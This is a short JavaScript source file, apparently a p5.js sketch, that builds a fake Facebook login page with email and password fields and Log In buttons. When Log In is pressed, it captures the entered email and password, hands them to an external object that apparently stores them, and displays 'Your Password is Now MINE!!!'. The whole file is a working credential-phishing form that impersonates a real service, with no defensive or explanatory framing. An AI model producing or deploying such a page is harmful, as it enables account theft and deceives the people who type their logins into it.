class Form{
    constructor()
    {
        this.name = createInput('Email or phone number');
        this.pw = createInput('Password');
        this.button = createButton('Log In');
        this.button2 = createButton('Log in with Browser');
        this.title = createElement('h2');
        this.w = createElement('h1');
        this.t = createElement('h5');
        this.t2 = createElement('h5');
        this.image = loadImage('i.png');
    }

    display()
    {
        this.title.html('Facebook');
        this.title.style('color', 'white');
        this.title.position(5,1);

        this.t.html('Sign Up For Facebook');
        this.t.style('color','white');
        this.t.position((displayWidth / 2) - 130, (displayHeight / 2) + 165);
        this.t2.html('Forgot Password');
        this.t2.style('color','white');
        this.t2.position((displayWidth / 2) - 120, (displayHeight / 2) + 250);

        this.name.position((displayWidth / 2) - 250, (displayHeight / 2) - 150);
        this.name.size(350,28);

        this.pw.position((displayWidth / 2) - 250, (displayHeight / 2) - 100);
        this.pw.size(350,28);

        this.button.style('color', 'white');
        this.button.style('background-color', 'blue');
        this.button.position((displayWidth / 2) - 250, (displayHeight / 2) - 40);
        this.button.size(359,45);

        this.button2.size(359,45);
        this.button2.style('color', 'white');
        this.button2.style('background-color', 'blue');
        this.button2.position((displayWidth / 2) - 250, (displayHeight / 2) + 30);

        this.button.mousePressed(()=>{
            this.button2.hide();
            this.button.hide();
            this.t.hide();
            this.t2.hide();
            this.pw.hide();
            this.name.hide();
            var na = this.name.value();
            var pa = this.pw.value();
            l.updatepw(pa);
            l.update(na);
            this.w.html('Your Password is Now MINE!!!');
            this.w.position(100,100);
            this.w.style('color','white');
        });
        image(this.image,300,50,800,800);
    }
}